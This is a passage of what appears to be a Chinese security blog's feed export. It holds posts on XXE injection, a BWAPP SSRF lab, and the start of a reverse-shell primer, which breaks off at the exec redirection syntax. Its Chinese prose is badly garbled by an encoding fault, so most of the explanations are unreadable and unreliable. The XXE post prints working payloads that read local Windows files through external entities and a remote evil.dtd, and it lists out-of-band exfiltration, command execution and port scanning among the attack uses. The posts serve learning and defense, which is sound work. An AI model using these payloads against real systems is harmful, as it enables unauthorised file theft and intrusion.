&quot;å…¬ç”¨DTDçš„URI&quot;&gt;</code></li></ul><p>DTDä¸­è¿›è¡Œå®ä½“å£°æ˜æ—¶ï¼Œå°†ä½¿ç”¨ENTITYå…³é”®å­—æ¥å£°æ˜ï¼Œå®ä½“æ˜¯ç”¨æ¥å®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚</p><ul><li><p>å†…éƒ¨å£°æ˜å®ä½“æ ¼å¼ï¼š<code>&lt;!ENTITY å®ä½“åç§° â€œå®ä½“çš„å€¼&quot;&gt;</code></p><p>ä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆ:<code>&amp;</code>, å®ä½“åç§°, <code>;</code>ï¼Œ<strong><code>&amp;</code>åœ¨GETå’ŒPOSTä¸­éƒ½éœ€è¦è¿›è¡ŒURLç¼–ç ï¼ˆä½¿ç”¨å‚æ•°ä¼ å…¥xmlçš„ï¼Œ&amp;ç¬¦å·ä¼šè¢«è®¤ä¸ºæ˜¯å‚æ•°é—´çš„è¿æ¥ç¬¦å·ï¼‰</strong></p></li><li><p>å¼•ç”¨å¤–éƒ¨å®ä½“æ ¼å¼ï¼š<code>&lt;!ENTITY å®ä½“åç§°  SYSTEM&quot;URI&quot;&gt;</code></p><p>å¤–éƒ¨å¼•ç”¨å¯æ”¯æŒhttpï¼Œfileç­‰åè®®ï¼Œä½†ä¸åŒçš„è¯­è¨€æ”¯æŒçš„åè®®ä¸åŒã€‚</p></li><li><p>å¼•ç”¨å…¬å…±å®ä½“:<code>&lt;!ENTITY å®ä½“åç§° PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></p></li></ul><p>ä¸Šé¢å°†å®ä½“åˆ†æˆäº†å†…éƒ¨å®ä½“å’Œå¤–éƒ¨å®ä½“ï¼Œä»å¦ä¸€ä¸ªè§’åº¦ï¼Œå®ä½“ä¹Ÿå¯ä»¥åˆ†æˆé€šç”¨å®ä½“å’Œå‚æ•°å®ä½“ã€‚é€šç”¨å®ä½“æ˜¯ä¸Šè¿°<code>&amp;</code>è¿æ¥çš„ã€‚</p><p>å‚æ•°å®ä½“ï¼š</p><ul><li><p>ä½¿ç”¨ <code>% å®ä½“å</code> åœ¨ DTD ä¸­å®šä¹‰ï¼Œä¸”<strong>åªèƒ½åœ¨ DTD ä¸­ä½¿ç”¨ <code>%å®ä½“å;</code> å¼•ç”¨</strong></p></li><li><p>åªæœ‰åœ¨ DTD æ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“</p></li><li><p>å‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨</p></li></ul><h2 id="XXEæ¼æ´åˆ©ç”¨"><a class="header-anchor" href="#XXEæ¼æ´åˆ©ç”¨">ğŸ­</a>XXEæ¼æ´åˆ©ç”¨</h2><p>xxeåˆ©ç”¨åˆ†ä¸ºä¸¤å¤§åœºæ™¯ï¼šæœ‰å›æ˜¾å’Œæ— å›æ˜¾ã€‚æœ‰å›æ˜¾çš„æƒ…å†µå¯ä»¥ç›´æ¥åœ¨é¡µé¢ä¸­çœ‹åˆ°Payloadçš„æ‰§è¡Œç»“æœæˆ–ç°è±¡ï¼Œæ— å›æ˜¾çš„æƒ…å†µåˆç§°ä¸ºblind xxeï¼Œå¯ä»¥ä½¿ç”¨å¤–å¸¦æ•°æ®é€šé“æå–æ•°æ®ã€‚</p><p>åˆ©ç”¨æ–¹å¼ï¼š</p><ul><li><p>æ‹’ç»æœåŠ¡æ”»å‡»</p></li><li><p>æ–‡ä»¶è¯»å–</p><p>é€šè¿‡åŠ è½½å¤–éƒ¨å®ä½“ï¼Œåˆ©ç”¨file://ï¼Œphp://ç­‰ä¼ªåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œä½†æ˜¯åˆ©ç”¨file://ä¼ªåè®®æ— æ³•è¯»å– PHPæ–‡ä»¶çš„å†…å®¹ï¼Œå› ä¸ºè¯»å–çš„å†…å®¹ä¼šè¢«è§£ææ‰§è¡Œçœ‹ä¸åˆ°æºç ã€‚å¯ä»¥åˆ©ç”¨php://ä¼ªåè®®å¯¹æ–‡ä»¶å†…å®¹è¿›è¡ŒBase-64ç¼–ç ï¼Œè¿™æ ·å°±å¯ä»¥è¯»åˆ°Base-64ç¼–ç åçš„æºç ï¼Œç„¶åå†é€šè¿‡Base64è§£ç å³å¯ï¼ˆSSRFçš„BWAPPä»»åŠ¡äºŒä¸­æœ‰å®ç°ï¼‰</p></li><li><p>å‘½ä»¤(ä»£ç )æ‰§è¡Œ</p><p>è°ƒç”¨<code>except://</code>ä¼ªåè®®è°ƒç”¨ç³»ç»Ÿå‘½ä»¤</p></li><li><p>SQL/XSSæ³¨å…¥</p></li><li><p>æ‰«æç«¯å£</p></li><li><p>å†…ç½‘åº”ç”¨æ”»å‡»</p></li><li><p>å†…ç½‘æ¢æµ‹</p><p>åˆ©ç”¨XXEè¿›è¡Œå†…ç½‘æ¢æµ‹ï¼Œå¦‚æœç«¯å£å¼€å¯ï¼Œå“åº”æ—¶é—´ä¼šå¾ˆçŸ­ï¼Œåä¹‹ï¼Œå¦‚æœå…³é—­ï¼Œå“åº”æ—¶é—´å°±é•¿ï¼Œ</p></li></ul><h3 id="Normal-XXE-è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶"><a class="header-anchor" href="#Normal-XXE-è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶">ğŸ­</a>Normal XXE è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶</h3><p><strong>å¼•ç”¨å¤–éƒ¨å®ä½“</strong></p><p>æœ¬æ¥æƒ³åœ¨æœ¬åœ°æµ‹è¯•ï¼Œç»“æœä¸€å †è¯­æ³•æŠ¥é”™ï¼Œphpç‰ˆæœ¬æ¢äº†å‡ æ¬¡è¿˜æ˜¯ä¸è¡Œï¼Œå°±æ­äº†ä¸€ä¸ªæµ‹è¯•å¹³å°æ¥æµ‹è¯•</p><p>payload:</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span> <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">creds</span> [  </span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">goodies</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span> ]&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span></code></pre><p>or</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY  % <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://localhost/evil.dtd&quot;</span> &gt;</span></span><span class="hljs-meta">%xxe;]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;evil;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span></code></pre><p>å¤–éƒ¨evil.dtd:</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">evil</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></code></pre><p>resultï¼š</p><img src="/2021/02/10/XXE/2.jpg" alt="2" style="zoom:80%;"><p><strong>ç‰¹ä¾‹:</strong></p><p>åœ¨ä¸Šè¿°payloadä¸­ï¼Œè‹¥å¤–éƒ¨å¼•ç”¨çš„æ–‡ä»¶å­˜åœ¨å¯èƒ½ä¼šå¼•èµ· xml  æ ¼å¼æ··ä¹±çš„å­—ç¬¦(åœ¨XMLä¸­ï¼Œæœ‰æ—¶å®ä½“å†…åŒ…å«äº†äº›å­—ç¬¦ï¼Œå¦‚<code>&amp;,&lt;,&gt;,&quot;,'</code>ç­‰å°±éœ€è¦è¿›è¡Œè½¬ä¹‰ï¼Œå¦åˆ™ä¼šå¯¹XMLè§£é‡Šå™¨ç”Ÿæˆé”™è¯¯)ï¼Œè¿™æ—¶å€™å°±è¦ç”¨åˆ°ä¸Šé¢ä»‹ç»çš„CDATAã€‚ä½†æˆ‘ä»¬ä¸èƒ½åœ¨ xml ä¸­è¿›è¡Œæ‹¼æ¥ï¼ˆä¼šæŠ¥é”™ï¼‰ï¼Œåªèƒ½åœ¨DTDï¼ˆä½¿ç”¨å®ä½“å‚æ•°ï¼‰ä¸­æ‹¼æ¥ååœ¨ xml ä¸­è°ƒç”¨</p><p><img src="/2021/02/10/XXE/3.png" alt="3"></p><p><strong>å†…ç½‘ç«™ç‚¹çš„å…¥ä¾µ</strong></p><p>åœ¨SSRFä¸­ä»‹ç»ã€‚</p><h3 id="Blind-OOB-XXE"><a class="header-anchor" href="#Blind-OOB-XXE">ğŸ­</a>Blind  OOB XXE</h3><p>å½“æœåŠ¡å™¨ä¸å‘æ”»å‡»è€…çš„æµè§ˆå™¨æˆ–ä»£ç†è¿”å›ä»»ä½•å“åº”æ—¶ï¼Œæˆ‘ä»¬å°±éœ€è¦æ„å»ºä¸€æ¡å¤–å¸¦æ•°æ®(OOB)é€šé“æ¥è¯»å–æ•°æ®ã€‚è™½ç„¶æˆ‘ä»¬æ— æ³•ç›´æ¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œä½†æˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨æ˜“å—æ”»å‡»çš„æœåŠ¡å™¨ä½œä¸ºä»£ç†ï¼Œåœ¨å¤–éƒ¨ç½‘ç»œä¸Šæ‰§è¡Œæ‰«æä»¥åŠä»£ç ã€‚</p><p>åŸç†å¦‚ä¸‹ï¼š</p><p><img src="/2021/02/10/XXE/5.png" alt="5"></p><p>æ²¡æœ‰vpså°±ä¸æ¼”ç¤ºè¾½ï¼ŒXXEçš„BWAPPåœ¨SSRFé‡Œæ¼”ç¤ºè¿‡äº†ï¼Œä¸å†èµ˜è¿°</p><h2 id="æ‹“å±•"><a class="header-anchor" href="#æ‹“å±•">ğŸ­</a>æ‹“å±•</h2><p><strong>XML Schema</strong>ï¼š</p><p>å¯æ‰©å±•æ ‡è®°è¯­è¨€æ¶æ„ï¼Œå®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ï¼Œç±»ä¼¼ DTDï¼Œ</p><p><strong>xmlns:</strong></p><p>å½“å¤šä¸ªæ–‡æ¡£è¢«ä¸€èµ·ä½¿ç”¨æ—¶ä¸åŒæ–‡æ¡£å†…å®¹ä¸åŒä½†ä½¿ç”¨å®šä¹‰åç§°ç›¸åŒçš„å…ƒç´ ï¼Œè¿™æ ·å°±ä¼šå‘ç”Ÿå‘½åå†²çªï¼ŒXMLè§£é‡Šå™¨æ— æ³•å¤„ç†è¿™ç±»å†²çªï¼Œè€Œxmlnså¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ä¸ºæ ‡ç­¾æ·»åŠ äº†ä¸€ä¸ª xmlns å±æ€§ï¼Œè¿™æ ·å°±ä¸ºå‰ç¼€èµ‹äºˆäº†ä¸€ä¸ªä¸æŸä¸ªå‘½åç©ºé—´ç›¸å…³è”çš„é™å®šåç§°ã€‚æ­¤æ—¶å†æŠŠå®ƒä»¬æ”¾åœ¨ä¸€èµ·ï¼ŒXMLè§£æå™¨ä¾¿ä¸ä¼šæŠ¥é”™ã€‚</p><p><img src="/2021/02/10/XXE/4.png" alt="4"></p><p><strong>xsi:schemaLocationå±æ€§</strong></p><p>å®šä¹‰XML Namespaceå’Œå¯¹åº”çš„  XSDæ–‡æ¡£çš„ä½ç½®çš„å…³ç³»ã€‚å®ƒçš„å€¼ç”±ä¸€ä¸ªæˆ–å¤šä¸ªURIå¼•ç”¨å¯¹ç»„æˆï¼Œä¸¤ä¸ªURIä¹‹é—´ä»¥ç©ºç™½ç¬¦åˆ†éš”ã€‚ç¬¬ä¸€ä¸ªURIæ˜¯å®šä¹‰çš„  XML  Namespaceçš„å€¼ï¼Œç¬¬äºŒä¸ªURIç»™å‡ºSchemaæ–‡æ¡£çš„ä½ç½®ï¼ŒSchemaå¤„ç†å™¨å°†ä»è¿™ä¸ªä½ç½®è¯»å–Schemaæ–‡æ¡£ï¼Œæ–‡æ¡£çš„targetNamespaceå¿…é¡»ä¸ç¬¬ä¸€ä¸ªURIç›¸åŒ¹é…ã€‚</p><p><strong>XML Schemaæ”»å‡»æ–¹å¼</strong></p><ul><li>schemaLocation</li><li>noNamespaceSchemaLocation</li><li>XInclude</li><li>XSLT æ”»å‡»</li></ul><p>è¯¦è§ï¼š<a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247489349&amp;idx=1&amp;sn=ab435be65bc6c35a21ea4bd040693d8c&amp;source=41#wechat_redirect">æˆ‘æƒ³è¦ä¸€ä¸ªXXE</a></p><h2 id="æ¼æ´é˜²å¾¡"><a class="header-anchor" href="#æ¼æ´é˜²å¾¡">ğŸ­</a>æ¼æ´é˜²å¾¡</h2><ul><li>ç¦ç”¨å¤–éƒ¨å®ä½“ã€‚åœ¨ä»£ç ä¸­è®¾ç½®<code>libxml_disable_entity_loader(true)</code></li><li>è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®ã€‚è¿‡æ»¤å…³é”®è¯ä¸º<code>&lt;!DOCTYPEã€&lt;!ENTITYã€ SYSTEMå’ŒPUBLIC</code></li></ul><p>å®ŒğŸ’–ğŸ’–ğŸ’–ğŸ’–</p><p>å‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247489349&amp;idx=1&amp;sn=ab435be65bc6c35a21ea4bd040693d8c&amp;source=41#wechat_redirect">æˆ‘æƒ³è¦ä¸€ä¸ªXXE</a></p><p><a href="https://xz.aliyun.com/t/3357#toc-8">ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/9626241.html">bwappäº²æµ‹xxeæ¼æ´    </a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BWAPP||SSRF</title>
    <link href="/2021/02/10/BWAPP/"/>
    <url>/2021/02/10/BWAPP/</url>
    
    <content type="html"><![CDATA[<p>ç³»ç»Ÿå­¦ä¹ SSRFåï¼Œæˆ‘ä»¬å¯ä»¥æ­ä¸ªBWAPPç»ƒä¹ ä¸€ä¸‹ï¼ŒBWAPPé›†æˆäº†å„ç§å¸¸è§æ¼æ´å’Œæœ€æ–°æ¼æ´çš„å¼€æºWebåº”ç”¨ç¨‹åºï¼Œé›†æˆäº†è¶…è¿‡100ç§æ¼æ´ï¼Œä»Šå¤©æˆ‘ä»¬è¦ç»ƒä¹ ä¸€ä¸‹SSRFéƒ¨åˆ†ï¼ˆæ‰¾äº†å¥½ä¹…æ‰æ‰¾åˆ°SSRFæ¿å—ğŸ˜¡ğŸ˜¡ğŸ˜¡ï¼‰</p><p><img src="/2021/02/10/BWAPP/1.jpg" alt="1"></p><p>æœ‰ä¸‰ä¸ªä»»åŠ¡ï¼š</p><p><img src="/2021/02/10/BWAPP/2.jpg" alt="2"></p><h2 id="Task-One-ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«è¿›è¡Œç«¯å£æ‰«æ"><a class="header-anchor" href="#Task-One-ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«è¿›è¡Œç«¯å£æ‰«æ">ğŸ­</a>Task One:ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«è¿›è¡Œç«¯å£æ‰«æ</h2><p>RFI,<code>Remote File Inclusion</code>è¿œç¨‹æ–‡ä»¶åŒ…å«(æ–‡ä»¶åŒ…å«åœ¨dvwaé‚£ä»‹ç»è¿‡äº†)</p><p>ä»Port scanè·å¾—ä¸€ä»½ç«¯å£æ‰«æçš„æ”»å‡»è„šæœ¬</p><p><img src="/2021/02/10/BWAPP/3.jpg" alt="3"></p><p>é€‰æ‹©æ¼æ´ç±»å‹</p><p><img src="/2021/02/10/BWAPP/4.jpg" alt="4"></p><p>æ‰§è¡Œåå‘ç°GETè¯·æ±‚æ˜æ˜¾å­˜åœ¨æ–‡ä»¶åŒ…å«é—®é¢˜</p><p><img src="/2021/02/10/BWAPP/5.jpg" alt="5"></p><p>æ„é€ payloadï¼š</p><p><img src="/2021/02/10/BWAPP/6.jpg" alt="6"></p><p>å¯¹<code>169.254.7.41</code>ä¸»æœºè¿›è¡Œæ‰«æï¼Œç»“æœå¦‚ä¸Šï¼ŒæˆåŠŸ~~</p><h2 id="Task-Twoï¼šä½¿ç”¨XXEè·å–æ•æ„Ÿæ–‡ä»¶ä¸­çš„å†…å®¹"><a class="header-anchor" href="#Task-Twoï¼šä½¿ç”¨XXEè·å–æ•æ„Ÿæ–‡ä»¶ä¸­çš„å†…å®¹">ğŸ­</a>Task Twoï¼šä½¿ç”¨XXEè·å–æ•æ„Ÿæ–‡ä»¶ä¸­çš„å†…å®¹</h2><p>XXEåœ¨å¦ä¸€ç¯‡æ–‡ç« ã€ŠXXEã€‹ä¸­ä»‹ç»äº†ï¼Œä»»åŠ¡äºŒçš„ssrf-2.txtç»™äº†æˆ‘ä»¬ä¸¤ä¸ªä»£ç åˆ†åˆ«å®Œæˆä¸¤ä¸ªå°ä»»åŠ¡</p><ul><li><p>è®¿é—®å†…éƒ¨ç½‘ç»œä¸Šçš„æ–‡ä»¶:</p><p><img src="/2021/02/10/BWAPP/8.jpg" alt="8"></p></li><li><p>ä½¿ç”¨PHPBase64ç¼–ç å™¨è¿‡æ»¤å™¨è¿”å›é¡µé¢çš„XMLæ¨¡å¼å‹å¥½ç‰ˆæœ¬ï¼š</p></li></ul><p><img src="/2021/02/10/BWAPP/9.jpg" alt="9"></p><p>è§£ç :</p><p><img src="/2021/02/10/BWAPP/10.jpg" alt="10"></p><p>è·å–æ•æ„Ÿæ–‡ä»¶</p><p><img src="/2021/02/10/BWAPP/7.jpg" alt="7"></p><p>Task Threeæ‹’ç»æœåŠ¡æ¼æ´å°šæœªæ¥è§¦ï¼Œç­‰ä»¥åå­¦äº†å†æ¥ğŸŒğŸŒğŸŒğŸŒ</p><p>å‚è€ƒï¼š<a href="https://www.freebuf.com/column/157466.html">SSRFå­¦ä¹ ä¹‹è·¯</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Reverse Shell</title>
    <link href="/2021/02/08/shell/"/>
    <url>/2021/02/08/shell/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨å­¦ä¹ SSRFï¼Œé‡åˆ°äº†åå¼¹shellï¼Œåˆå‘ç°äº†çŸ¥è¯†ç›²åŒºğŸ’¢ğŸ’¢ğŸ’¢ï¼Œæ•…æ¥æ¶è¡¥ä¸€ä¸‹ğŸƒğŸƒğŸƒ</p><h1>å®šä¹‰</h1><p>reverse shellï¼Œæ§åˆ¶ç«¯ç›‘å¬åœ¨æŸTCP/UDPç«¯å£ï¼Œè¢«æ§ç«¯å‘èµ·è¯·æ±‚åˆ°è¯¥ç«¯å£ï¼Œå¹¶å°†å…¶å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ§åˆ¶ç«¯ã€‚ç®€è€Œè¨€ä¹‹å°±æ˜¯æ§åˆ¶ç«¯å¯ä»¥é€šè¿‡æ‰§è¡Œè¢«æ§ç«¯ä¸Šçš„å‘½ä»¤å¹¶è¿”å›åˆ°æ§åˆ¶ç«¯ä¸Šã€‚</p><h1>ç”¨é€”</h1><p>å½“æ§åˆ¶ç«¯é€šè¿‡æ”»å‡»æ‰“å¼€äº†è¢«æ§ç«¯çš„ä¸€ä¸ªç«¯å£ï¼Œæ§åˆ¶ç«¯åœ¨è‡ªå·±ä¸»æœºå»è¿æ¥è¢«æ§ç«¯æœ¬æœºå«åšæ­£å‘è¿æ¥ã€‚ä½†æ˜¯å‡ºç°ä»¥ä¸‹å‡ ç§æƒ…å†µæ—¶æ­£å‘è¿æ¥å°±å¾ˆå›°éš¾ï¼š</p><ul><li>è¢«æ§ç«¯è¢«ç½‘é©¬è¿æ¥ä¸Šï¼Œä½†å®ƒåœ¨å±€åŸŸç½‘å†…ï¼Œæ— æ³•ç›´æ¥è¿æ¥</li><li>è¢«æ§ç«¯çš„ipåŠ¨æ€æ”¹å˜</li><li>é˜²ç«å¢™é™åˆ¶</li><li>è¿æ¥çš„ç«¯å£è¢«å ç”¨</li></ul><p>è¿™æ—¶å€™æˆ‘ä»¬éœ€è¦æŒ‡å®šä¸€ä¸ªæœåŠ¡ç«¯ï¼Œè®©å—å®³è€…ä¸»æœºä¸»åŠ¨è¿æ¥æœåŠ¡ç«¯ç¨‹åºã€‚ä½†æˆ‘ä»¬è¿˜éœ€äº†è§£ä¸€ä¸‹åå¼¹shellçš„æ ¸å¿ƒã€‚</p><h1>Linux||file discriptor</h1><p>åœ¨Linuxä¸­ï¼Œå½“æˆ‘ä»¬æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå†…æ ¸ä¸ºäº†é«˜æ•ˆç®¡ç†å·²è¢«æ‰“å¼€çš„æ–‡ä»¶ä¼šåˆ›å»ºç´¢å¼•ç”¨äºæŒ‡ä»£è¢«æ‰“å¼€çš„æ–‡ä»¶ï¼Œæ‰§è¡Œæ“ä½œç³»ç»Ÿé€šè¿‡æ–‡ä»¶æè¿°ç¬¦è¿›è¡Œè°ƒç”¨ã€‚<strong>Linuxä¸‹ä¸€åˆ‡çš†æ–‡ä»¶</strong>è¦å¯¹æŸä¸ªè®¾å¤‡è¿›è¡Œæ“ä½œï¼Œå°±éœ€è¦æ‰“å¼€æ­¤è®¾å¤‡çš„æ–‡ä»¶ï¼Œæ‰“å¼€æ–‡ä»¶å°±ä¼šè·å¾—è¯¥æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ ï¼Œæ¯ä¸ªè¿›ç¨‹åœ¨<code>Process Control  Block</code>ä¸­ä¿å­˜ç€ä¸€ä»½æ–‡ä»¶æè¿°ç¬¦è¡¨ï¼Œæ–‡ä»¶æè¿°ç¬¦å°±æ˜¯è¿™ä¸ªè¡¨çš„ç´¢å¼•ï¼Œæ¯ä¸ªè¡¨é¡¹éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘å·²æ‰“å¼€æ–‡ä»¶çš„æŒ‡é’ˆã€‚æ•…ï¼š</p><ul><li>æ¯ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¼šä¸ä¸€ä¸ªæ‰“å¼€çš„æ–‡ä»¶ç›¸å¯¹åº”</li><li>ä¸åŒçš„æ–‡ä»¶æè¿°ç¬¦ä¹Ÿå¯èƒ½æŒ‡å‘åŒä¸€ä¸ªæ–‡ä»¶</li><li>ç›¸åŒçš„æ–‡ä»¶å¯ä»¥è¢«ä¸åŒçš„è¿›ç¨‹æ‰“å¼€ï¼Œä¹Ÿå¯ä»¥åœ¨åŒä¸€ä¸ªè¿›ç¨‹è¢«å¤šæ¬¡æ‰“å¼€</li></ul><p>ç³»ç»Ÿéšä¹‹åˆ›å»º3ä¸ªè¡¨ï¼š</p><ul><li>è¿›ç¨‹çº§çš„æ–‡ä»¶æè¿°ç¬¦è¡¨</li><li>ç³»ç»Ÿçº§çš„æ–‡ä»¶æè¿°ç¬¦è¡¨</li><li>æ–‡ä»¶ç³»ç»Ÿçš„i-nodeè¡¨</li></ul><p>3ä¸ªè¡¨çš„ä½œç”¨è¯¦è§:<a href="https://segmentfault.com/a/1190000009724931">æ–‡ä»¶æè¿°ç¬¦</a></p><p>å½“Linuxå¯åŠ¨çš„æ—¶å€™ä¼šé»˜è®¤æ‰“å¼€ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼š</p><table><thead><tr><th>æ–‡ä»¶æè¿°ç¬¦</th><th>ç¼©å†™</th><th>æè¿°</th></tr></thead><tbody><tr><td>0</td><td>STDIN</td><td>æ ‡å‡†è¾“å…¥</td></tr><tr><td>1</td><td>STDOUT</td><td>æ ‡å‡†è¾“å‡º</td></tr><tr><td>2</td><td>STDERR</td><td>æ ‡å‡†é”™è¯¯è¾“å‡º</td></tr></tbody></table><p>æ¯æ¡shellå‘½ä»¤ï¼Œéƒ½ä¼šç»§æ‰¿å…¶çˆ¶è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå½“æˆ‘ä»¬éœ€è¦è®©è¾“å‡ºä¸æ˜¾ç¤ºåœ¨æ˜¾ç¤ºå™¨ä¸Šï¼Œè€Œæ˜¯è¾“å‡ºåˆ°æ–‡ä»¶æˆ–è€…å…¶ä»–è®¾å¤‡ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦é‡å®šå‘ã€‚</p><h1>Redirect</h1><p>é‡å®šå‘ä¸»è¦åˆ†ä¸ºä¸¤ç§</p><ul><li>è¾“å…¥é‡å®šå‘<code> &lt; &lt;&lt;</code></li><li>è¾“å‡ºé‡å®šå‘ <code>&gt; &gt;&gt;</code></li></ul><table><thead><tr><th>ç±»å‹</th><th>ç¬¦å·</th><th>æ ¼å¼</th><th>ç”¨æ³•</th></tr></thead><tbody><tr><td>è¾“å…¥é‡å®šå‘</td><td><code> &lt; &lt;&lt;</code></td><td>[n]&lt; word</td><td>å°†æ–‡ä»¶æè¿°ç¬¦ n é‡å®šå‘åˆ° word æŒ‡ä»£çš„æ–‡ä»¶ï¼ˆåªè¯»ï¼‰,né»˜è®¤ä¸º0ï¼ˆæ ‡å‡†è¾“å…¥ï¼‰</td></tr><tr><td>è¾“å‡ºé‡å®šå‘</td><td><code>&gt; &gt;&gt;</code></td><td>[n]&gt; word</td><td>å°†æ–‡ä»¶æè¿°ç¬¦ n é‡å®šå‘åˆ°word æŒ‡ä»£çš„æ–‡ä»¶ï¼ˆå†™ï¼‰ï¼Œn é»˜è®¤ä¸º 1ï¼ˆæ ‡å‡†è¾“å‡ºï¼‰</td></tr></tbody></table><p>å‡ ç§å¸¸è§æ–¹å¼:</p><table><thead><tr><th>é‡å®šå‘æ–¹å¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>301 redirect</td><td>æ°¸ä¹…æ€§è½¬ç§»ï¼Œæ˜¯ç½‘é¡µæ›´æ”¹åœ°å€åå¯¹æœç´¢å¼•æ“å‹å¥½çš„æœ€å¥½æ–¹æ³•</td></tr><tr><td>302 redirect</td><td>æš‚æ—¶æ€§è½¬ç§»</td></tr><tr><td>meta fresh</td><td>é€šè¿‡ç½‘é¡µä¸­çš„metaæŒ‡ä»¤ï¼Œåœ¨ç‰¹å®šæ—¶é—´åé‡å®šå‘åˆ°æ–°çš„ç½‘é¡µï¼Œå¦‚æœå»¶è¿Ÿçš„æ—¶é—´å¤ªçŸ­(çº¦5ç§’ä¹‹å†…)ï¼Œä¼šè¢«åˆ¤æ–­ä¸ºspamã€‚</td></tr></tbody></table><p>bash åœ¨æ‰§è¡Œä¸€æ¡æŒ‡ä»¤æ—¶ï¼Œä¼šå…ˆæ£€æŸ¥å‘½ä»¤ä¸­å­˜ä¸å­˜åœ¨é‡å®šå‘çš„ç¬¦å·ï¼Œå¦‚æœå­˜åœ¨å…ˆå°†æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘ï¼Œç„¶åå†æŠŠé‡å®šå‘å»æ‰ï¼Œæ‰§è¡ŒæŒ‡ä»¤ï¼ˆæœ‰ç‚¹ä¼˜å…ˆçº§çš„æ„Ÿè§‰ï¼‰ã€‚å¦‚æœæŒ‡ä»¤ä¸­å­˜åœ¨å¤šä¸ªé‡å®šå‘ï¼Œé‡å®šå‘ä¼šä»å·¦å‘å³è§£æã€‚</p><p><strong>æ–‡ä»¶æè¿°ç¬¦çš„å¤åˆ¶</strong></p><p>æ ¼å¼</p><pre><code class="hljs inform7"><span class="hljs-comment">[n]</span>&lt;&amp;<span class="hljs-comment">[m]</span> ï¼ˆåªè¯»ï¼‰/ <span class="hljs-comment">[n]</span>&gt;&amp;<span class="hljs-comment">[m]</span>ï¼ˆå†™ï¼‰</code></pre><p><strong>&amp; æ˜¯ä¸ºäº†åŒºåˆ†æ•°å­—åå­—çš„æ–‡ä»¶å’Œæ–‡ä»¶æè¿°ç¬¦ï¼Œå¦‚æœæ²¡æœ‰&amp; ç³»ç»Ÿä¼šè®¤ä¸ºæ˜¯å°†æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘åˆ°äº†ä¸€ä¸ªæ•°å­—ä½œä¸ºæ–‡ä»¶åçš„æ–‡ä»¶</strong></p><p><strong>exec ç»‘å®šé‡å®šå‘</strong></p><p>æ ¼å¼</p><pre><code class="hljs arcade">exec [n] &lt;<span class="hljs-regexp">/&gt; 